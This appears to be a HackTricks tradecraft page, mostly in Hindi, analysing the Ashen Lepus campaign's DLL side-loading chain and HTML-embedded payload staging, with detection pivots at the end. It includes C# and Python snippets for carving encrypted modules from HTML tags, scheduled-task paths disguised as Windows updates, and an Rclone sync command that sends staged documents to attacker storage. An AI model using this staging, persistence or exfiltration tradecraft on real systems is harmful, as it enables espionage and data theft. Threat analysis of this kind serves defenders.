# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) ने एक दोहराने योग्य पैटर्न को weaponize किया जो DLL sideloading, staged HTML payloads, और modular .NET backdoors को चेन करता है ताकि Middle Eastern diplomatic networks में persistence हासिल की जा सके। यह technique किसी भी operator के लिए फिर से उपयोग करने योग्य है क्योंकि यह इन पर निर्भर करती है:

- **Archive-based social engineering**: benign PDFs लक्ष्यों को फ़ाइल-शेयरिंग साइट से एक RAR archive डाउनलोड करने का निर्देश देते हैं। आर्काइव में एक वास्तविक जैसा दिखने वाला document viewer EXE, एक malicious DLL जो भरोसेमंद लाइब्रेरी के नाम पर रखा गया है (उदा., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), और एक decoy `Document.pdf` बंडल किया जाता है।
- **DLL search order abuse**: पीड़ित EXE पर डबल-क्लिक करता है, Windows वर्तमान निर्देशिका से DLL import को resolve करता है, और malicious loader (AshenLoader) trusted process के अंदर execute होता है जबकि decoy PDF शंका से बचने के लिए खुल जाता है।
- **Living-off-the-land staging**: हर बाद का चरण (AshenStager → AshenOrchestrator → modules) तब तक डिस्क पर रखा नहीं जाता जब तक ज़रूरत न हो, और इन्हें encrypted blobs के रूप में भेजा जाता है जो अन्यथा harmless HTML responses के अंदर छिपे होते हैं।

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE AshenLoader को side-load करता है, जो host recon करता है, इसे AES-CTR से encrypt करता है, और उसे rotating parameters जैसे `token=`, `id=`, `q=`, या `auth=` के अंदर POST करता है API-looking paths (उदा., `/api/v2/account`) पर।
2. **HTML extraction**: C2 केवल तभी अगला चरण प्रकट करता है जब client IP लक्ष्य क्षेत्र में geolocate करता है और `User-Agent` implant से मेल खाता है, जिससे sandboxes विफल होते हैं। जब ये checks पास हो जाते हैं तो HTTP body में `<headerp>...</headerp>` blob होता है जिसमें Base64/AES-CTR encrypted AshenStager payload होता है।
3. **Second sideload**: AshenStager को एक और legitimate binary के साथ deploy किया जाता है जो `wtsapi32.dll` import करता है। उस binary में inject की गई malicious copy और अधिक HTML fetch करती है, इस बार `<article>...</article>` carve करके AshenOrchestrator को recover किया जाता है।
4. **AshenOrchestrator**: एक modular .NET controller जो Base64 JSON config को decode करता है। config के `tg` और `au` fields को concatenated/hashed कर के AES key बनाया जाता है, जो `xrk` को decrypt करता है। परिणामस्वरूप bytes बाद में fetch किए गए हर module blob के लिए XOR key के रूप में काम करते हैं।
5. **Module delivery**: प्रत्येक module HTML comments के माध्यम से वर्णित होता है जो parser को किसी arbitrary tag की ओर redirect करते हैं, जिससे static rules जो केवल `<headerp>` या `<article>` देखते हैं टूट जाते हैं। Modules में persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), और file exploration (`FE`) शामिल हैं।

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
भले ही defenders किसी विशिष्ट element को ब्लॉक या strip कर दें, operator को केवल HTML comment में संकेतित tag को बदलने की आवश्यकता होती है ताकि delivery फिर से जारी हो सके।

### त्वरित निष्कर्षण सहायक (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

हाल की HTML smuggling रिसर्च (Talos) यह बताती है कि payloads अक्सर `<script>` ब्लॉक्स में Base64 स्ट्रिंग्स के रूप में छुपाए जाते हैं और runtime पर JavaScript से डिकोड होते हैं। यही तरकीब C2 responses के लिए भी दोबारा इस्तेमाल की जा सकती है: एक script टैग (या अन्य DOM element) के अंदर encrypted blobs को stage करें और AES/XOR से पहले उन्हें इन-मेमोरी डिकोड करें, जिससे पेज सामान्य HTML जैसा दिखे।

## Crypto & C2 Hardening

- **AES-CTR everywhere**: current loaders में 256-bit keys और nonces (उदा., `{9a 20 51 98 ...}`) एम्बेड होते हैं और कभी-कभी decryption से पहले/बाद में `msasn1.dll` जैसे स्ट्रिंग्स का उपयोग करते हुए एक अतिरिक्त XOR layer जोड़ा जाता है।
- **Infrastructure split + subdomain camouflage**: staging servers टूल के हिसाब से अलग रखे जाते हैं, विभिन्न ASNs पर होस्ट होते हैं, और कभी-कभी legitimate-सा दिखने वाले subdomains से front किए जाते हैं, इसलिए एक stage compromise करने से बाकी चीजें उजागर नहीं होतीं।
- **Recon smuggling**: enumeration में अब Program Files listings शामिल हैं ताकि उच्च-मूल्य वाले apps पहचाने जा सकें और जो डेटा हटता है वह हमेशा encrypted होता है।
- **URI churn**: query parameters और REST paths campaigns के बीच बदलते रहते हैं (`/api/v1/account?token=` → `/api/v2/account?auth=`), जिससे कमजोर detections बेअसर हो जाती हैं।
- **Gated delivery**: servers geo-fenced होते हैं और केवल वास्तविक implants को जवाब देते हैं। अनऑथराइज़्ड clients को unsuspicious HTML भेजा जाता है।

## Persistence & Execution Loop

AshenStager scheduled tasks ड्रॉप करता है जो Windows maintenance jobs के रूप में छुपते हैं और `svchost.exe` के जरिए execute होते हैं, उदाहरण के लिए:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

ये tasks boot या intervals पर sideloading chain को relaunch करते हैं, जिससे AshenOrchestrator बिना फिर से डिस्क को छुए नए modules request कर सकता है।

## Using Benign Sync Clients for Exfiltration

Operators `C:\Users\Public` (world-readable और non-suspicious) में diplomatic documents stage करने के लिए एक dedicated module का उपयोग करते हैं, फिर legitimate [Rclone](https://rclone.org/) binary डाउनलोड करके उस directory को attacker storage के साथ synchronize करते हैं। Unit42 के अनुसार यह पहली बार है जब इस actor ने exfiltration के लिए Rclone इस्तेमाल किया देखा गया है, और यह सामान्य ट्रेंड के साथ मेल खाता है जिसमें legitimate sync tooling का दुरुपयोग करके सामान्य ट्रैफ़िक में घुलना शामिल है:

1. **Stage**: लक्ष्य फ़ाइलों को `C:\Users\Public\{campaign}\` में copy/collect करें।
2. **Configure**: एक Rclone config भेजें जो attacker-controlled HTTPS endpoint की तरफ इशारा करता हो (उदा., `api.technology-system[.]com`)।
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` चलाएँ ताकि ट्रैफ़िक सामान्य क्लाउड बैकअप जैसा दिखे।

चूँकि Rclone वैध बैकअप वर्कफ़्लो के लिए व्यापक रूप से उपयोग होता है, defenders को anomalous executions (नई binaries, अजीब remotes, या अचानक `C:\Users\Public` का syncing) पर ध्यान देना चाहिए।

## Detection Pivots

- Alert on **signed processes** जो यूज़र-लिखने योग्य paths से DLLs लोड करते हैं (Procmon filters + `Get-ProcessMitigation -Module`), विशेषकर जब DLL नाम `netutils`, `srvcli`, `dwampi`, या `wtsapi32` से ओवरलैप करें।
- संदिग्ध HTTPS responses की जाँच करें कि उनमें **बड़े Base64 blobs असामान्य टैग्स के अंदर एम्बेड** तो नहीं हैं या वे `<!-- TAG: <xyz> -->` टिप्पणियों से guarded तो नहीं हैं।
- HTML hunting को बढ़ाएँ ताकि `<script>` ब्लॉक्स के अंदर Base64 strings (HTML smuggling-style staging) ढूंढी जा सकें जो JavaScript से decode होकर AES/XOR processing से पहले उपयोग होती हैं।
- उन scheduled tasks को खोजें जो `svchost.exe` को non-service arguments के साथ चलाते हैं या dropper directories की ओर इशारा करते हैं।
- IT-managed लोकेशन के बाहर प्रकट होने वाले **Rclone** binaries, नए `rclone.conf` फाइलें, या staging directories जैसे `C:\Users\Public` से sync jobs पर निगरानी रखें।

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
